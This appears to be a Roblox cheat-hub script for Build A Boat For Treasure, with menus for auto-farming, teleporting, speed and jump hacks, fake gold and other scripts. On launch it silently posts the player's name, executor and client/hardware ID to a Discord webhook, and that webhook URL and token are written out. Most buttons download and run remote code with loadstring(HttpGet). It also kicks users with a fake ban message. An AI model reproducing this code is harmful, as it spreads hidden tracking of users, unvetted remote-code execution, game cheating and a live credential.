local Webhook = "https://discord.com/api/webhooks/1097548811053830175/Mso8HIlHPAf-nxAnUWvSP97XmqTPA4wgpCJ8aOoxFJD0Ui1f1NUCHbgM2LA9m-Kwpm7i"
local plrname = game.Players.LocalPlayer.Name

local PlayerData =
{
       ["content"] = "",
       ["embeds"] = {
           {
           ["title"] = "Name: "..plrname,
           ["description"] = "Execute is: ".. identifyexecutor(),
           ["color"] = tonumber(0x00FF00),
           ["fields"] = {
               {
                   ["name"] = "HWID ID:",
                   ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                   ["inline"] = true
},
           },
        }
    }
}

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)

Request = http_request or request or HttpPost or syn.request
Request(
    {
        Url = Webhook, 
        Body = PlayerData, 
        Method = "POST", 
        Headers = {["content-type"] = "application/json"} 
    }
)

-- Define the allowed PlaceGameID
local allowedPlaceGameID = 537413528 -- Replace with your own PlaceGameID

-- Get the user's PlaceGameID
local placeGameID = game.PlaceId

-- Check if the user's PlaceGameID matches the allowed ID
if placeGameID == allowedPlaceGameID then
else
    -- If the user's PlaceGameID doesn't match the allowed ID, kick them
    game.Players.LocalPlayer:Kick("Banned | Reason: Cheating")
end

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/GUI"))() 
local Window = Library.CreateLib("Build A Boat For Treasure | NONAME HUB 4.0", "DarkTheme")

local Tab = Window:NewTab("💳 Auto Farm") local Section = Tab:NewSection("🧧 Script Auto Farm")
Section:NewButton("Click", " Auto Farm Script", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Auto%20Farm.lua"))() end)
local Section = Tab:NewSection("🚀 Teleport Farm")
Section:NewButton("Auto Teleport Farm", "Respawned = Stop Script Auto Farm", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Auto%20Teleport%20Farm.lua"))() end)

local Tab = Window:NewTab("🔨 Auto Builder") 
local Section = Tab:NewSection("🧱 Script Auto Builder")

Section:NewButton("Click", "🧱 Script Auto Builder", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Auto%20Builder.lua"))() end)

local Section = Tab:NewSection("🎨 Script Auto Builder Image")

Section:NewButton("Click", "🎨Script Auto Builder Image", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Auto%20Builder%20Image.lua"))() end)

local Tab = Window:NewTab("👑 Fake") 
local Section = Tab:NewSection("∞ Fake Gold")

Section:NewButton("Click", "NONAME HUB", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Fake%20Gold"))()
end)

local Section = Tab:NewSection("🧱 Fake Blocks")

Section:NewButton("Click", "NONAME HUB", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Fake%20All.lua"))()
end)

local Tab = Window:NewTab("🎄 Quests") 
local Section = Tab:NewSection("🍞 Bread Quest")
Section:NewButton("Click", "Loads in the fabbie boss (you need to be leader for this to work", function() workspace.QuestMakerEvent:FireServer(100) end)

local Section = Tab:NewSection("🎁 Gift Quest")
Section:NewButton("Click", "Loads in the gingerbread Fight (you need to be leader for this to work", function() workspace.QuestMakerEvent:FireServer(99) end)

local Section = Tab:NewSection("👩‍👧‍👧 Christmas Quest")
Section:NewButton("Click", "Loads in the xmas Fight (you need to be leader for this to work", function() workspace.QuestMakerEvent:FireServer(101) end)

local Section = Tab:NewSection("🎄 Auto Loop Quest") 

local Section = Tab:NewSection("🍞 Loop Quest Bread Quest")
Section:NewToggle("Click 150 Seconds", "can't stop If you stop will join the game again.", function() 
while true do
		workspace.QuestMakerEvent:FireServer(100)
	wait(150) 
end
	end)

local Section = Tab:NewSection("🎁 Loop Quest Gift Quest")
Section:NewToggle("Click 150 Seconds", "can't stop If you stop will join the game again.", function() 
while true do
	workspace.QuestMakerEvent:FireServer(99)
	wait(150) 
end
	end)
		
local Section = Tab:NewSection("👩‍👩‍ Loop Quest Christmas Quest")
Section:NewToggle("Click 150 Seconds", "can't stop If you stop will join the game again.", function()
while true do
	workspace.QuestMakerEvent:FireServer(101)
	wait(150) 
end
	end)

local Section = Tab:NewSection("💥 Event BOSS")
Section:NewButton("🎃 HALLOWEEN BOSS", " TP ", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/AUTO%20FARM%20HALLOWEEN%20BOSS.lua"))() end)

Section:NewButton("🥚 EGG BOSS", " TP ", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/TP%20EGG%20%20BOSS.lua"))() end)


local Tab = Window:NewTab("🌌 Teleport")

local Section = Tab:NewSection("📃 Teleport Player !")
Plr = {}
for i,v in pairs(game:GetService("Players"):GetChildren()) do
    table.insert(Plr,v.Name) 
end

local drop = Section:NewDropdown("📃 Select Player!", "Click To Select", Plr, function(t)
   PlayerTP = t
end)
Section:NewButton("🎯 Teleport", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[PlayerTP].Character.HumanoidRootPart.CFrame
end)
Section:NewToggle("🎯 Auto Teleport", "", function(t)
_G.TPPlayer = t
while _G.TPPlayer do wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[PlayerTP].Character.HumanoidRootPart.CFrame
end
end)

Section:NewButton("💾 Refresh","Refresh", function()
  drop:Refresh(Plr)
end)


local Section = Tab:NewSection("⬜ White")
Section:NewButton("Click", "NONAME HUB", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-50.0028458, -9.65999889, -567.075378, -0.999934494, 1.69590315e-08, -0.0114457831, 1.56394382e-08, 1, 1.15380317e-07, 0.0114457831, 1.15193757e-07, -0.999934494) end)

local Section = Tab:NewSection("⬛ Black")
Section:NewButton("Click", "NONAME HUB", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-550.587769, -9.65999889, -69.4330597, 0.044106476, -2.16794671e-09, -0.999026835, -4.38382752e-09, 1, -2.36360198e-09, 0.999026835, 4.48381154e-09, 0.044106476) end)

local Section = Tab:NewSection("🟥 Red")
Section:NewButton("Click", "NONAME HUB", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(443.415039, -9.65999889, -64.935936, -0.0039063096, -1.38479038e-07, 0.999992371, 2.78122503e-08, 1, 1.38588746e-07, -0.999992371, 2.83534085e-08, -0.0039063096) end)

local Section = Tab:NewSection("🟦 Blue")
Section:NewButton("Click", "NONAME HUB", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(443.401245, -9.65999889, 300.047424, 0.0413250774, -1.24215788e-07, 0.999145746, 3.61023424e-08, 1, 1.2282878e-07, -0.999145746, 3.09955936e-08, 0.0413250774) end)
                
local Section = Tab:NewSection("🟩 Green")
Section:NewButton("Click", "NONAME HUB", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new( -550.645752, -9.65999889, 293.29657, 0.0522636063, 3.91167561e-08, -0.998633325, -3.50806033e-08, 1, 3.73343418e-08, 0.998633325, 3.30814345e-08, 0.0522636063) end)

local Section = Tab:NewSection("🟨 Yellow")
Section:NewButton("Click", "NONAME HUB", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-550.60083, -9.65999889, 640.269409, 0.0527031086, 5.94260179e-08, -0.998610198, 9.28528578e-08, 1, 6.44091642e-08, 0.998610198, -9.61183773e-08, 0.0527031086) end)

local Section = Tab:NewSection("🟪 Magenta")
Section:NewButton("Click", "NONAME HUB", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(443.725342, -9.89999676, 647.826416, -0.00752122747, -6.9397494e-08, 0.999971688, -4.07260288e-08, 1, 6.90931401e-08, -0.999971688, -4.02052116e-08, -0.00752122747) end)

local Tab = Window:NewTab("👨‍💻 Player")

local Section = Tab:NewSection("👁 Spectate Player")
Section:NewButton("👁 Spectate", " ", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Spectate%20Player"))() end)

local Section = Tab:NewSection("🎛 All Deffault")

Section:NewButton("Deffault", "WalksSpeed & JumpPower Deffault", function() 
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50 end)

local Section = Tab:NewSection("⚡ WalksSpeed")

Section:NewButton("Speed 45", "WalksSpeed", function() game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 45 end)
Section:NewButton("Speed 90", "WalksSpeed", function() game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 90 end) 

local Section = Tab:NewSection("⚡ WalksSpeed Deffault")

Section:NewButton("Deffault", "WalksSpeed Deffault", function() game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16 end)

local Section = Tab:NewSection("🦵 JumpPower")

Section:NewButton("JumpPower 100", "JumpPower", function() game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100 end)
Section:NewButton("JumpPower 200", "JumpPower", function() game.Players.LocalPlayer.Character.Humanoid.JumpPower = 200 end)

local Section = Tab:NewSection("🦵 JumpPower Deffault")

Section:NewButton("Deffault", "JumpPower Deffault", function() game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50 end)

local Tab = Window:NewTab("🎮 Main") 

local Section = Tab:NewSection("↻ Rejoin")

Section:NewButton("Click", "ออกเข้าใหม่", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/blox-fruit-fake-level-/main/Rejoin%20Game.lua"))() end)

local Section = Tab:NewSection("👁‍ X-Ray")
Section:NewButton("Click", "Press X To X-Ray", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/X-Ray.lua"))() end)
		
local Section = Tab:NewSection("❄ Infinite Yield")

Section:NewButton("Click", "เปิด Infinite Yield", function() loadstring(game:HttpGet(("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"),true ))() end)

local Section = Tab:NewSection("🕧 Anit AFK")
  
Section:NewButton("Click", "เปิด Anit AFK", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Roblox-Script-AFK/main/Script%20AFK.lua"))() end)

local Section = Tab:NewSection("☁ Remove Fog")
  
Section:NewButton("Click", "", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Remove%20Fog.lua"))() end)

local Tab = Window:NewTab("🗂 Script Hub")

local Section = Tab:NewSection("📕 Astra Hub")
Section:NewButton("Click", "", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Astra%20Hub.lua"))() end)

local Section = Tab:NewSection("📕 Emotes")
Section:NewButton("Click", "press to </ม to Open", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Emotes.lua"))() end)

local Section = Tab:NewSection("📕 Max2007killer")
Section:NewButton("Click", "Key Donatepls152621", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Max2007killer.lua"))() end)

local Tab = Window:NewTab("🎫 credit") local Section = Tab:NewSection("By: peatchXD#6075")

Section:NewKeybind("⚙ press to change button", "KeybindInfo", Enum.KeyCode.F, function() Library:ToggleUI() end)  
